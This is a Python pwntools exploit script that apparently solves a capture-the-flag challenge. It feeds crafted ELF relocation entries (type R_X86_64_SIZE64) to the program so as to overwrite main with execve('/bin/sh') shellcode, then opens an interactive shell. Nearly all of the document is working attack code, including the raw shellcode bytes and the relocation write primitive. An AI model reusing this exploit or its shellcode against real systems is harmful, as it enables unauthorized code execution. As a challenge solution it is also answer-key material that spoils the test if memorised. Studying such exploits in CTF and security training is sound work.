import argparse

from pwn import *

debug = True

context.log_level = 'debug' if debug else 'info'
context.terminal = ['tmux', 'splitw', '-v']
context.arch = 'amd64'

PATH = "/handout/challenge"
LIBC = "/handout/libc.so.6"
LD = "/handout/ld-linux.so.2"
# e = ELF(PATH)
# libc = ELF(LIBC)

network = len(sys.argv) > 1

if network:
    parser = argparse.ArgumentParser()
    default_addr = os.environ.get("HOST", "127.0.0.1") + ":" + os.environ.get("PORT", "31337")
    parser.add_argument("--network", action='store_true')
    parser.add_argument("address", default=default_addr,
                        nargs="?", help="Address of challenge")
    args = parser.parse_args()
    HOST, PORT = args.address.split(':')

    r = remote(HOST, int(PORT))
else:
#    r = process(PATH)
    r = gdb.debug(PATH, f'''
file {PATH}
break *main
c
''', api=True)

def do_one(offset, info, addend, another=True):
    r.sendlineafter(b"Elf64_Rela[].r_offset = ", f"{offset:x}".encode())
    r.sendlineafter(b"Elf64_Rela[].r_info = ", f"{info:x}".encode())
    r.sendlineafter(b"Elf64_Rela[].r_addend = ", f"{addend:x}".encode())
    r.sendlineafter(b"Do another?", b"1" if another else b"0")

# https://shell-storm.org/shellcode/files/shellcode-806.html
sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
sc += b"\x90" * (8 - (len(sc) % 8))

# write to main (0x149c)
# this relocation (33) is just a straight write since st_size = 0
# case R_X86_64_SIZE64:
#   /* Set to symbol size plus addend.  */
#   *(Elf64_Addr *) (uintptr_t) reloc_addr
#     = (Elf64_Addr) sym->st_size + reloc->r_addend;
#   break;
# so the answer is pretty trivial if you read the source :)

do_one(0x149c, 33, u64(sc[0:8]), True)
do_one(0x149c+8, 33, u64(sc[8:16]), True)
do_one(0x149c+16, 33, u64(sc[16:24]), True)
do_one(0x149c+24, 33, u64(sc[24:32]), False)

r.interactive()